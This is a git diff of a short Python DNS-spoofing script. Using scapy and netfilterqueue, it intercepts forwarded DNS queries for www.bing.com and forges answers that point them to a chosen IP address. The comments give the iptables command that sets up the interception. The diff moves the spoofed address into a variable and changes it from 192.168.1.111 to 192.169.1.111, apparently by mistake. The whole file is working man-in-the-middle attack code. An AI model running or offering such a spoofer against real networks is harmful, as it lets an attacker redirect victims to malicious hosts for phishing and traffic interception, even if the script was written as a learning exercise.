@@ -3,7 +3,7 @@ import netfilterqueue
 import scapy.all as scapy
 
 # You must run first "sudo iptables -I FORWARD -j NFQUEUE --queue-num 0"
-# When you finish return the iptables to its previous state "iptables --flush"
+# When you finish return the iptables to its original state "sudo iptables --flush"
 
 
 def process_packet(packet):
@@ -12,7 +12,8 @@ def process_packet(packet):
         qname = scapy_packet[scapy.DNSQR].qname
         if "www.bing.com".encode() in qname:
             print('[+] Spoofing target')
-            answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.111")
+            website = "192.169.1.111"
+            answer = scapy.DNSRR(rrname=qname, rdata=website)
             scapy_packet[scapy.DNS].an = answer
             scapy_packet[scapy.DNS].ancount = 1
 
@@ -28,3 +29,4 @@ def process_packet(packet):
 queue = netfilterqueue.NetfilterQueue()
 queue.bind(0, process_packet)
 queue.run()
+
